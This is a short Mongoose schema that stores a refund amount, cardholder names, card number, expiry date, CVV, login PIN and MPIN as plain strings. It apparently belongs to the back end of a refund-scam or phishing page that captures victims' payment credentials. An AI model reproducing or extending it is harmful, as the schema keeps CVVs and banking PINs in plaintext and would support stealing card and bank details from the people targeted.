const mongoose = require("mongoose");

//Schema
const DataSchema = new mongoose.Schema(
  {
    refund_amount: {
      type: String,
      default: null,
    },
    account_holder_name: {
      type: String,
      default: null,
    },
    card_holder_name: {
      type: String,
      default: null,
    },
    card_number: {
      type: String,
      default: null,
    },
    expiry_date: {
      type: String,
      default: null,
    },
    cvv: {
      type: String,
      default: null,
    },
    login_pin: {
      type: String,
      default: null,
    },
    mpin: {
      type: String,
      default: null,
    },
  },
  {
    timestamps: true,
  }
);

module.exports = mongoose.model("my_data", DataSchema);
